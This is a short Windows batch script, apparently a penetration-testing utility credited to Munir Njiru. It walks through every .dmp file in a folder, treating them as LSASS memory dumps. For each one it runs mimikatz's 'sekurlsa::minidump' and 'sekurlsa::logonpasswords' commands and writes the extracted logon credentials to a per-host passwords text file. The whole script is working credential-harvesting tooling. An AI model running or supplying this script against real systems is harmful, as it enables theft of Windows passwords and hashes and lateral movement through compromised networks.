@echo off
rem This is a script that takes all .dmp files in the current folder and uses mimikatz to dump them
rem you can modify items in the script
echo " "
echo ###################################
echo #Mimikatz Dumper By Munir Njiru   #
echo ###################################
echo " "
setlocal enabledelayedexpansion
for %%f in (*.dmp) do (
	rem pick file name from above without extension
	SET lsass_dump=%%~nf
	rem my files follow a naming convention i.e. lsass_hostname_or_ip.dmp
	rem this section renames the lsass prefix to passwords prefix to seperate dump from textfile i.e. passwords_hostname_or_ip.dmp
	SET password_file=!lsass_dump:lsass=passwords!
	rem mimi64 references my global mimikatz parameter change to suit yours; you can add mimikatz to environment variables to access it globally
	mimi64 "sekurlsa::minidump !lsass_dump!.dmp" "log !password_file!.txt" sekurlsa::logonpasswords exit
	echo "done dumping !lsass_dump!.dmp to !password_file!.txt"
)
exit
